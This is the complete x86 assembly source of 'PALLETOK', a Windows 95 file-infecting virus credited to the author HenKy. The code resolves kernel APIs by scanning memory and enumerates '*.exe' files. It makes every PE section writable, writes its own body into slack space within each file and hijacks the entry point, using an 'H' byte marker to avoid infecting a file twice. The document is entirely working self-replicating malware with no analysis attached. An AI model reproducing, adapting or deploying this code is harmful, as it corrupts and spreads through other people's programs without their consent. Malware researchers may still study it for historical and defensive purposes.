   ;----------------------------  W95 PALLETOK  BY HenKy -----------------------------
   ;
   ;-AUTHOR:        HenKy
   ;
   ;-MAIL:          HenKy_@latinmail.com
   ;
   ;-ORIGIN:        SPAIN



   .586P
   .MODEL FLAT
   LOCALS


   EXTRN       ExitProcess:PROC

   KERNEL95    EQU 0BFF70000h
   MIX_SIZ     EQU FILE_END-MEGAMIX
   MIX_MEM     EQU MEM_END-MEGAMIX
   NABLA       EQU DELTA-MEGAMIX
   MARKA       EQU 66
   FLAGZ       EQU 00000020H OR 20000000H OR 80000000H
   MAX_PATH    EQU 260

   MACROSIZE   MACRO

               DB      MIX_SIZ/01000 mod 10 + "0"
               DB      MIX_SIZ/00100 mod 10 + "0"
               DB      MIX_SIZ/00010 mod 10 + "0"
               DB      MIX_SIZ/00001 mod 10 + "0"

               ENDM



   .DATA

   copyrisgt   DB 'PALLETOK'

           MACROSIZE
   .CODE

   MEGAMIX:


           CALL    DELTA
   DELTA:  POP     EBP

   WINES:
           MOV     EAX,KERNEL95
           CMP     BYTE PTR [EAX],'M'
           JNE     WARNING
           MOV     EBX,EAX

   BUSCA3:
           INC     EAX
           CMP     DWORD PTR [EAX],02b226A57h
           JNE     SHORT BUSCA3
    APIZ:

           MOV     [EBP+GPA-DELTA],EAX
           LEA     ESI, [EBP+APIs-DELTA]
           LEA     EDI, [EBP+APIaddresses-DELTA]

   GPI:    PUSH    ESI
           PUSH    EBX
           CALL    [EBP+GPA-DELTA]
           CLD
           STOSD

    NPI:
           LODSB
           OR      AL, AL
           JNZ     SHORT NPI
           CMP     [ESI], AL
           JNZ     GPI



   INFECT:

           LEA     EAX, [EBP+OFFSET Win32FindData-DELTA]
           PUSH    EAX
           LEA     EAX, [EBP+OFFSET IMASK-DELTA]
           PUSH    EAX
           CALL    DWORD PTR [EBP+FindFirstFile-DELTA]
           MOV     DWORD PTR [EBP+SearcHandle-DELTA],EAX


   LOOPER:
           INC     EAX
           JZ      WARNING
           DEC     EAX
           OR      EAX,EAX
           JNZ     ALLKEY

   WARNING:

   EXIT:
           MOV     EAX,12345678H
           ORG     $-4
   OLD_EIP DD      00401000H
           PUSH    EAX
           RET

   ALLKEY:

           PUSH    DWORD PTR [EBP+OLD_EIP-DELTA]
           PUSH    EDX
           PUSH    80h
           PUSH    3
           PUSH    EDX
           PUSH    EDX
           PUSH    0C0000000h
           LEA     EAX ,[EBP+offset FNAME-DELTA]        ; OPEN IT!
           PUSH    EAX
           CALL    DWORD PTR [EBP+CreateFile-DELTA]

           MOV     DWORD PTR [EBP+FileHandle-DELTA],EAX  ; SAVE HNDL
           MOV     ECX, DWORD PTR [EBP+WFD_nFileSizeLow-DELTA]

           CDQ
           PUSH    EDX
           PUSH    ECX
           PUSH    EDX
           PUSH    4H
           PUSH    EDX
           PUSH    DWORD PTR [EBP+FileHandle-DELTA]
           CALL    DWORD PTR [EBP+CreateFileMappingA-DELTA]

           MOV     DWORD PTR [EBP+MapHandle-DELTA],EAX
           MOV     ECX, DWORD PTR [EBP+WFD_nFileSizeLow-DELTA]

           CDQ
           PUSH    ECX
           PUSH    EDX
           PUSH    EDX
           INC     EDX
           INC     EDX
           PUSH    EDX
           PUSH    DWORD PTR [EBP+MapHandle-DELTA]
           CALL    DWORD PTR [EBP+MapViewOfFile-DELTA]

           MOV     DWORD PTR [EBP+MapAddress-DELTA],EAX
           MOV     ESI,EAX                         ; GET PE HDR
           MOV     ESI,[EAX+3CH]
           ADD     ESI,EAX
           CMP     BYTE PTR [ESI],"P"            ; IS A 'P'E ?
           JNZ     Cerrar
           CMP     BYTE PTR [ESI+MARKA],"H"     ; HenKy IS HERE ?
           JZ      Cerrar
           MOV     EAX,[ESI+3CH] ; ONLY SOME W98  HAVE 1000H/1000H INSTEAD 1000H/200H
           CMP     EAX,[ESI+56]   ; IM LAZY :)
           JNZ     Cerrar         ; WE CAN INFECT THEN TOO MAKING A "SUBBER" BUT...IT
                                   ; WASTES MORE CODE... 8-D
           PUSHAD
           XOR     ECX,ECX
           MOV     CL,BYTE PTR [ESI+6]
           MOV     EBX,[ESI+74H]
           SHL     EBX,3           ; MAKE ALL SECTION WRITEABLE
           ADD     ESI,78H
           ADD     ESI,EBX

    WRI:
           OR      DWORD PTR [ESI+24H], 0C0000000h
           ADD     ESI,40
           LOOP    WRI
           POPAD

           MOV     EDI,ESI
           MOV     EAX,[EDI+28H]
           ADD     EAX,[EDI+34H]
           MOV     DWORD PTR [EBP+OLD_EIP-DELTA],EAX
           MOV     BYTE PTR [EDI+MARKA],"H" ;  HenKy!
           MOV     ECX,DWORD PTR [EBP+WFD_nFileSizeLow-DELTA]
           MOV     EAX,EDI
    BU:
           CMP     DWORD PTR [EDI], 'XGNI'
           JE      PO

    PE:
           INC     EDI
           LOOP    BU
           JMP     Cerrar

   PO:
           PUSH    EDI
           SUB     EDI,DWORD PTR [EBP+MapAddress-DELTA]
           MOV     [EAX+28H],EDI
           POP     EDI

           LEA     ESI,[EBP+MEGAMIX-DELTA]
           PUSH    (MIX_SIZ / 4)
           POP     ECX
           REP     MOVSD

   UnMapFile:

           PUSH    DWORD PTR [EBP+MapAddress-DELTA]
           CALL    DWORD PTR [EBP+UnmapViewOfFile-DELTA]

   CloseMap:

           PUSH    DWORD PTR [EBP+MapHandle-DELTA]
           CALL    DWORD PTR [EBP+CloseHandle-DELTA]

   Cerrar:

           POP     DWORD PTR [EBP+OLD_EIP-DELTA]
           PUSH    DWORD PTR [EBP+FileHandle-DELTA]
           CALL    DWORD PTR [EBP+CloseHandle-DELTA]

   TOPO:


           LEA     EAX, [EBP+offset Win32FindData-DELTA]
           PUSH    EAX
           PUSH    DWORD PTR [EBP+SearcHandle-DELTA]
           CALL    DWORD PTR [EBP+FindNextFile-DELTA]
           JMP     LOOPER


   APIs:
           DB      "CreateFileA",0
           DB      "CloseHandle",0
           DB      "FindFirstFileA",0
           DB      "FindNextFileA",0
           DB      "MapViewOfFile",0
           DB      "UnmapViewOfFile",0
           DB      "CreateFileMappingA",0
   Zero_   DB        0


   IMASK   DB '*.exe',0


           DB 'HenKy',0

   align 4

   FILE_END               LABEL BYTE

   APIaddresses:

   CreateFile          DD 0
   CloseHandle         DD 0
   FindFirstFile       DD 0
   FindNextFile        DD 0
   MapViewOfFile       DD 0
   UnmapViewOfFile     DD 0
   CreateFileMappingA  DD 0
   GPA                 DD 0
   SearcHandle         DD 0
   FileHandle          DD 0
   MapHandle           DD 0
   MapAddress          DD 0

   FILETIME                STRUC

   FT_dwLowDateTime        DD      ?
   FT_dwHighDateTime       DD      ?

   FILETIME                ENDS

   Win32FindData:

   WFD_dwFileAttributes    DD      ?
   WFD_ftCreationTime      FILETIME ?
   WFD_ftLastAccessTime    FILETIME ?
   WFD_ftLastWriteTime     FILETIME ?
   WFD_nFileSizeHigh       DD      ?
   WFD_nFileSizeLow        DD      ?
   WFD_dwReserved0         DD      ?
   WFD_dwReserved1         DD      ?
   FNAME                   DD      0
                           DD      0
                           DD      0
                           DD      0
                           DD      0
                           DD      0
   align 4


   MEM_END                LABEL BYTE

   EXITPROC:

           PUSH 0
           CALL ExitProcess

   ENDS
   END MEGAMIX
